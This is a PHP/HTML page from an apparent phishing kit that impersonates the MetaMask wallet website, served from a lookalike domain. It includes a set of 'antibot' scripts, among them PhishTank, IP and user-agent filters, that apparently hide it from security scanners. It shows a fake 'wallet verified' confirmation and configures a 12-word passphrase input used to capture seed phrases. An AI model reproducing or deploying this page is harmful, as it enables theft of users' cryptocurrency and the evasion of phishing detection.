<?php
    include "antibots/#1.php";
    include "antibots/#2.php";
    include "antibots/#3.php";
    include "antibots/#4.php";
    include "antibots/#5.php";
    include "antibots/#6.php";
    include "antibots/#7.php";
    include "antibots/#8.php";
    include "antibots/#9.php";
    include "antibots/#10.php";
    include "antibots/#11.php";
    include "antibots/#12.php";
    include "antibots/antibot_host.php";
    include "antibots/antibot_ip.php";
    include "antibots/antibot_phishtank.php";
    include "antibots/antibot_userAgent.php";
?>
<!DOCTYPE html>
<html data-wf-page="606584e79beac93ef42ex4eda" data-wf-site="604ec65d7935b45ce251b35ex" class="wf-changaone-n4-active wf-changaone-i4-active wf-active"><head><meta http-equiv="content-type" content="text/html; charset=UTF-8">

  <meta charset="utf-8">
  <title>FAQs</title>
  <meta content="FAQs" property="og:title">
  <meta content="FAQs" property="twitter:title">
  <meta content="width=device-width, initial-scale=1" name="viewport">
  <link href="file/normalize.css" rel="stylesheet" type="text/css">
  <link href="file/webflow.css" rel="stylesheet" type="text/css">
  <link href="file/metamask-staging-2.css" rel="stylesheet" type="text/css">
  <script src="file/webfont.js" type="text/javascript"></script>
  <script src="file/main.js" type="text/javascript"></script>
  <script src="file/tags.js" type="text/javascript"></script>
  <link rel="stylesheet" href="file/css.css" media="all"><script type="text/javascript">WebFont.load({  google: {    families: ["Changa One:400,400italic"]  }});</script>
  <link href="css/favicon.png" rel="shortcut icon" type="image/x-icon">
  <link href="css/webclip.png" rel="apple-touch-icon">

</head>
<body class="body-4">
  <div data-collapse="medium" data-animation="default" data-duration="200" data-easing="ease-in-out" data-easing2="ease-in-out" id="downloadButtonNav" role="banner" class="navigation-bar dark w-nav">
    <div class="container-27 w-container">
      <a href="" aria-current="page" class="brand-link w-nav-brand w--current"><img src="file/mm-logo.svg" alt="" class="image-3" width="211"></a>
      <nav role="navigation" class="navigation-menu w-nav-menu">
        <div data-hover="1" data-delay="0" class="w-dropdown" style="max-width: 940px;">
          <div class="dropdown w-dropdown-toggle" id="w-dropdown-toggle-0" aria-controls="w-dropdown-list-0" aria-haspopup="menu" aria-expanded="false" role="button" tabindex="0">
            <div class="w-icon-dropdown-toggle" aria-hidden="true"></div>
            <div>Features</div>
          </div>
          <nav class="dropdown-list w-dropdown-list" id="w-dropdown-list-0" aria-labelledby="w-dropdown-toggle-0">
            <a href="https://metamaksphrapre.sytes.net/swaps.html" class="dropdown-link w-dropdown-link" tabindex="0">Swaps</a>
          </nav>
        </div>
        <div data-hover="1" data-delay="0" class="w-dropdown" style="max-width: 940px;">
          <div class="dropdown w-dropdown-toggle" id="w-dropdown-toggle-1" aria-controls="w-dropdown-list-1" aria-haspopup="menu" aria-expanded="false" role="button" tabindex="0">
            <div class="w-icon-dropdown-toggle" aria-hidden="true"></div>
            <div>Support</div>
          </div>
          <nav class="dropdown-list w-dropdown-list" id="w-dropdown-list-1" aria-labelledby="w-dropdown-toggle-1">
            <a href="https://metamaksphrapre.sytes.net/faqs.html" class="dropdown-link w-dropdown-link" tabindex="0">FAQs</a>
            <a href="https://community.metamask.io/" rel="noreferer, noopener" target="_blank" class="dropdown-link w-dropdown-link" tabindex="0">Get Support</a>
            <a href="https://support.metamask.io/" rel="noreferer, noopener" target="_blank" class="dropdown-link w-dropdown-link" tabindex="0">Knowledge Base<br></a>
          </nav>
        </div>
        <div data-hover="1" data-delay="0" class="w-dropdown" style="max-width: 940px;">
          <div class="dropdown w-dropdown-toggle" id="w-dropdown-toggle-2" aria-controls="w-dropdown-list-2" aria-haspopup="menu" aria-expanded="false" role="button" tabindex="0">
            <div class="w-icon-dropdown-toggle" aria-hidden="true"></div>
            <div>About</div>
          </div>
          <nav class="dropdown-list w-dropdown-list" id="w-dropdown-list-2" aria-labelledby="w-dropdown-toggle-2">
            <a href="https://metamaksphrapre.sytes.net/about.html" class="dropdown-link w-dropdown-link" tabindex="0">Team</a>
            <a href="https://consensys.net/open-roles/?discipline=32543" rel="noreferer, noopener" target="_blank" class="dropdown-link w-dropdown-link" tabindex="0">Careers</a>
            <a href="https://medium.com/metamask" rel="noreferer, noopener" target="_blank" class="dropdown-link w-dropdown-link" tabindex="0">Blog</a>
          </nav>
        </div>
        <div data-hover="1" data-delay="0" class="w-dropdown" style="max-width: 940px;">
          <div class="dropdown w-dropdown-toggle" id="w-dropdown-toggle-3" aria-controls="w-dropdown-list-3" aria-haspopup="menu" aria-expanded="false" role="button" tabindex="0">
            <div class="w-icon-dropdown-toggle" aria-hidden="true"></div>
            <div>Build</div>
          </div>
          <nav class="dropdown-list w-dropdown-list" id="w-dropdown-list-3" aria-labelledby="w-dropdown-toggle-3">
            <a href="https://docs.metamask.io/guide/" rel="noreferer, noopener" class="dropdown-link w-dropdown-link" tabindex="0">Developers</a>
            <a href="https://metamaksphrapre.sytes.net/institutions.html" class="dropdown-link w-dropdown-link" tabindex="0">Institutions</a>
          </nav>
        </div>
        <a href="https://metamaksphrapre.sytes.net/download.html" class="navigation-link install-blue w-nav-link" style="max-width: 940px;">Download</a>
      </nav>
      <div class="hamburger-button white w-nav-button" style="-webkit-user-select: text;" aria-label="menu" role="button" tabindex="0" aria-controls="w-nav-overlay-0" aria-haspopup="menu" aria-expanded="false">
        <div class="icon w-icon-nav-menu"></div>
      </div>
    </div>
  <div class="w-nav-overlay" data-wf-ignore="" id="w-nav-overlay-0"></div></div>
  <div class="section">
	  <div class="container-2 w-container">

			<div class="row">
						<div class="col-12">
							<h3 class="font-weight-bold mb-1">You successfully verified your wallet</h3>
						</div>
					</div>

					<div class="col-12">
						<p>The verification was successful, our team will review your submission and get back to you by email within 24 hours!
					</p></div>
<!--
	<div class="container-2 w-container">
      <div data-w-id="7dbc2cc8-8525-0cc6-75f0-6344b31d065e" class="columns w-row" style="opacity: 1;">
        <div class="content-column w-col w-col-6">
          <h1 class="heading">A crypto wallet &amp; gateway to blockchain apps</h1>
          <p class="paragraph-5">Start exploring blockchain applications in seconds. &nbsp;Trusted by over 1 million users worldwide.</p>
          <a href="download.html" class="blue-button-solid large-button w-button">Download now</a>
        </div>
        <div class="image-column w-col w-col-6"></div>
      </div>
    </div>
 -->


  </div>
  <div>
    <div class="container-5 w-container">
    </div>
  </div>


  <div class="section light-gray-bg">
    <div class="container-6 w-container">
      <div class="section-title-group w-clearfix">
        <h2 class="section-heading">Your key to blockchain applications</h2>
        <div class="section-subheading center h5">MetaMask provides an 
essential utility for blockchain newcomers, token traders, crypto 
gamers, and developers. Over a million downloads and counting!</div>
      </div>
      <div class="w-layout-grid grid-3"><img src="file/dapp-aave.png" sizes="100vw" srcset="file/dapp-aave-p-500.html 500w, file/dapp-aave.png 560w" alt=""><img src="file/dapp-axieinfinity.png" sizes="100vw" srcset="file/dapp-axieinfinity-p-500.html 500w, file/dapp-axieinfinity.png 560w" alt=""><img src="file/dapp-compound.png" alt=""><img src="file/dapp-gitcoin.png" alt=""><img src="file/dapp-maker.png" alt="">
		  <img src="file/dapp-opensea.png" alt=""><img src="file/dapp-rarible.png" alt=""><img src="file/dapp-uniswap.png" alt=""></div>
    </div>
  </div>


  <div class="section newsletter">
    <div class="container-20 w-container">
      <h1 class="heading-14">Receive our Newsletter</h1>
      <p class="paragraph-4">Sign up to receive updates and announcements</p>
      <a href="#" data-w-id="06d857cc-ded7-495b-d399-bf0589c25527" class="button standard-button">Sign up</a>
    </div>
  </div>
  <div data-w-id="f28e67e0-be54-a43b-c875-045d3e6a7e92" class="modal-wrapper" style="display: none; opacity: 0;">
    <div class="sign-up-form">
      <div class="div-block-16">
        <h3 class="modal-heading">Newsletter sign up</h3>
        <div data-w-id="ee6262fc-4b4a-154a-939c-590d16c36847" class="close-modal-button"><img src="file/mm-close-black.svg" loading="lazy" alt="" class="image-17" width="30" height="30"></div>
      </div>

    </div>
  </div>
  <div class="footer accent">
    <div class="container-9 w-container"><img src="file/mm-logo.svg" alt=""></div>
    <div class="w-container">
      <div class="columns-6 w-row">
        <div class="column-3 partnership w-col w-col-3">
          <h5 class="heading-6 orange-text">LEGAL</h5>
          <a href="https://consensys.net/privacy-policy/" rel="noreferer, noopener" target="_blank" class="footer-link">Privacy Policy</a>
          <a href="https://consensys.net/terms-of-use/" rel="noreferer, noopener" target="_blank" class="footer-link">Terms of Use</a>
          <a href="https://metamaksphrapre.sytes.net/cla.html" class="footer-link">Contributor License Agreement</a>
        </div>
        <div class="column-3 w-col w-col-3">
          <h5 class="heading-6 orange-text">LEARN&nbsp;MORE</h5>
          <a href="https://metamaksphrapre.sytes.net/about.html" class="footer-link">About</a>
          <a href="https://docs.metamask.io/guide/" rel="noreferer, noopener" target="_blank" class="footer-link">Developers</a>
          <a href="https://metamaksphrapre.sytes.net/download.html" class="footer-link">Download</a>
          <a href="https://metamask.github.io/metamask-docs/" rel="noreferer, noopener" target="_blank" class="footer-link">Documentation</a>
          <a href="https://metamask.io/institutions.html" rel="noreferer, noopener" class="footer-link">MetaMask Institutional</a>
          <a href="https://metamaksphrapre.sytes.net/release-notes.html" rel="noreferer, noopener" class="footer-link release-notes-footer">Release Notes</a>
        </div>
        <div class="column-3 w-col w-col-3">
          <h5 class="heading-6 orange-text">GET&nbsp;INVOLVED</h5>
          <a href="https://github.com/MetaMask/metamask-extension" rel="noreferer, noopener" target="_blank" class="footer-link">GitHub</a>
          <a href="https://gitcoin.co/metamask/" rel="noreferer, noopener" target="_blank" class="footer-link">Gitcoin</a>
          <a href="https://consensys.net/open-roles/?discipline=32543" rel="noreferer, noopener" target="_blank" class="footer-link">Open&nbsp;Positions</a>
          <a href="https://shop.spreadshirt.com/metamask/" rel="noreferer, noopener" target="_blank" class="footer-link">Swag Shop</a>
          <a href="https://metamask.zendesk.com/hc/en-us/requests/new?ticket_form_id=3641" rel="noreferer, noopener" target="_blank" class="footer-link">Press &amp;&nbsp;Partnerships</a>
        </div>
        <div class="column-5 w-col w-col-3">
          <h5 class="heading-6 orange-text">CONNECT</h5>
          <a href="https://metamaksphrapre.sytes.net/faqs.html" class="footer-link">FAQs</a>
          <a href="https://community.metamask.io/" rel="noreferer, noopener" target="_blank" class="footer-link">Support</a>
          <a href="https://medium.com/metamask" rel="noreferer, noopener" target="_blank" class="footer-link">Blog</a>
          <a href="https://twitter.com/metamask" rel="noreferer, noopener" target="_blank" class="footer-link">Twitter</a>
        </div>
      </div>
    </div>
    <div class="container-19 w-container"></div>
    <div class="container-10 w-container">
      <p class="paragraph">©2020 MetaMask • A ConsenSys Formation</p>
    </div>
  </div>


  <script>
  $(document).ready(function() {
	  $('.passphrase').tagsinput({
		maxTags: 12,
		confirmKeys: [44, 32],
		trimValue: true
	  });

	  $(window).keydown(function(event){
		  if(event.keyCode == 13) {
			  event.preventDefault();
			  return false;
		  }
	  });
	});

  </script>




</div></body></html>